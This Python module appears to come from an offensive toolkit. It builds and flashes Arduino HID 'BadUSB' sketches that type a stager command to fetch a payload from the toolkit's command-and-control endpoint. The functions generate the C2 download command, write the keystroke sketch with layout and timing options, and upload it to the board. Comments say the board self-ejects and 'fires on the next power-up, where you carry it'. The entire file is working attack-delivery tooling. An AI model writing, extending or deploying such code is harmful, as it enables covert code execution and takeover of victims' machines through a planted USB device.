"""hid_flash.py — build and flash a HID artefact, returning DATA not prints.

The CLI (`payload hid ...`) talks to an operator through ``notifier``: it
prints notes, warnings and the flash steps. That is the right interface for a
terminal and the wrong one for a second surface (the Electron API) that has to
answer with JSON. This module is the shared middle: it performs the SAME
steps — build the stager command, build the sketch, write it where the
Arduino toolchain expects it, upload it — and returns a plain dict.

Two guarantees the CLI path already made and that must not be lost here:

  * the sketch folder is named after the ``.ino`` (the Arduino IDE refuses
    any other layout, and ``arduino-cli`` upload follows the same rule);
  * a flash is not "written to disk" — it only reports success when the
    upload step itself reported success, because a green tick that means
    "the file exists" is how an operator plugs in a board that types nothing.
"""
from __future__ import annotations

import os
import re
import secrets
from typing import Any, Dict, List, Optional

from phantom.utils.paths import data_dir


def _stager_command(platform: str = "windows", *, token: str = "",
                    attempts: Optional[int] = None) -> Dict[str, Any]:
    """The short typed command for the CURRENT endpoint (front-aware)."""
    from phantom.utils import short_stager as ss
    from phantom.utils.network import c2_endpoint_status

    ep = c2_endpoint_status()
    if not ep.host:
        return {"ok": False, "error": "no C2 endpoint to point the board at"}
    command = ss.hid_download_command(
        platform, ep.host, ep.port, token=token, ssl=ep.use_ssl,
        attempts=attempts)
    return {"ok": True, "command": command, "endpoint": ep.url,
            "via_front": bool(getattr(ep, "via_front", False)),
            "chars": len(command)}


def build(board: str, command: str = "", *, platform: str = "windows",
          token: str = "", layout: str = "", target: str = "",
          open_run: bool = True, eject: bool = True,
          countdown_s: Optional[int] = None, shots: Optional[int] = None,
          char_delay_ms: Optional[int] = None, nonce: str = "",
          out: str = "") -> Dict[str, Any]:
    """Build the sketch for ``board``. Returns {ok, path, chars, notes, ...}."""
    from phantom.utils.hid_builder import (ARDUINO_BOARDS, build_hid_payload,
                                           board_notes, canonical_board)
    from phantom.utils.hid_layouts import detected_layout

    if not command:
        made = _stager_command(platform, token=token)
        if not made.get("ok"):
            return {"ok": False, "error": made.get("error", "no command")}
        command = str(made["command"])
    if not layout:
        layout = detected_layout() or "us"
    # The variant the operator named (leonardo) and the FAMILY that drives the
    # generator (arduino) are two things: the variant names the artefact and
    # the FQBN, the family decides the generator. Passing the variant straight
    # to build_hid_payload is how a Leonardo sketch silently gets built as a
    # different board.
    variant = (board or "").strip().lower()
    family = canonical_board(variant)

    kwargs: Dict[str, Any] = {
        "target": target or platform,
        "layout": layout,
        "open_run": bool(open_run),
        "eject": bool(eject),
        "build_nonce": nonce or secrets.token_hex(4),
    }
    if countdown_s is not None:
        kwargs["countdown_s"] = int(countdown_s)
    if shots is not None:
        kwargs["shots"] = int(shots)
    if char_delay_ms is not None:
        kwargs["char_delay_ms"] = int(char_delay_ms)
    try:
        payload = build_hid_payload(family, command, **kwargs)
    except ValueError as exc:
        return {"ok": False, "error": str(exc)}

    name = f"{variant}_{payload.filename}"
    if family in ARDUINO_BOARDS:
        # folder MUST be named after the .ino (both the IDE and arduino-cli)
        stem = os.path.splitext(name)[0]
        name = os.path.join(stem, f"{stem}.ino")
    path = out or os.path.join(data_dir(), "vectors", name)
    try:
        os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
        with open(path, "w", encoding="utf-8", newline="\n") as handle:
            handle.write(payload.content)
    except OSError as exc:
        return {"ok": False, "error": f"could not write {path}: {exc}"}

    return {
        "ok": True,
        "path": path,
        "filename": payload.filename,
        "command": command,
        "chars": len(command),
        "layout": layout,
        "board": family,
        "variant": variant,
        "notes": list(payload.notes) + list(board_notes(family)),
        "typing_budget_s": _typing_budget(payload.content, len(command)),
    }


def _typing_budget(sketch: str, chars: int) -> float:
    """Seconds the board is visibly busy: countdown + delays + USB frames."""
    delays = [int(m) for m in re.findall(r"delay\((\d+)\);", sketch)]
    return round(3.0 + sum(delays) / 1000.0 + (2 * chars) / 1000.0, 2)


def boards(cli: str = "") -> List[Dict[str, Any]]:
    """Every board the Arduino toolchain can see, plus a plain USB hint.

    The hint matters: after a delivery the board SELF-EJECTS and stops
    enumerating, so `arduino-cli board list` shows nothing until an
    unplug/replug. Reporting "no board" without that sentence reads as a
    broken flasher.
    """
    from phantom.utils.arduino_flash import detect_boards
    from serial.tools import list_ports

    import dataclasses

    out: List[Dict[str, Any]] = []
    try:
        for board in detect_boards(cli=cli):
            # BoardCandidate is a dataclass, and `dict()` on one raises —
            # which silently fell through to the serial-port fallback and
            # reported a recognised Leonardo as a bare COM port.
            raw = (dataclasses.asdict(board) if dataclasses.is_dataclass(board)
                   else dict(getattr(board, "__dict__", {}) or {}))
            out.append({str(k): ("" if v is None else str(v))
                        for k, v in raw.items()})
    except Exception:
        out = []
    if not out:
        for port in list_ports.comports():
            out.append({"port": port.device,
                        "description": port.description or "",
                        "vid": f"{port.vid:04x}" if port.vid else "",
                        "pid": f"{port.pid:04x}" if port.pid else ""})
    return out


def flash(path: str, port: str = "", fqbn: str = "",
          cli: str = "", board: str = "") -> Dict[str, Any]:
    """Upload a built sketch. Success only if the upload step says so."""
    from phantom.utils.arduino_flash import flash_sketch, fqbn_for

    folder = os.path.dirname(os.path.abspath(path))
    if not os.path.isfile(path):
        return {"ok": False, "error": f"no sketch at {path}"}
    try:
        result = flash_sketch(folder, port or "",
                              fqbn=(fqbn or fqbn_for(board) or ""),
                              cli=(cli or None))
    except Exception as exc:              # toolchain missing, port in use…
        return {"ok": False, "error": str(exc)}
    steps = [getattr(step, "summary", lambda: str(step))() for step in
             getattr(result, "steps", []) or []]
    return {"ok": bool(getattr(result, "ok", False)),
            "summary": getattr(result, "summary", lambda: "")(),
            "steps": steps,
            "port": port or "(auto)",
            # the first boot after a flash is silent by design — say it, so
            # an operator does not read silence on THIS box as a failed flash
            "note": ("the board is silent on the machine that flashed it: "
                     "it fires on the next power-up, where you carry it")}
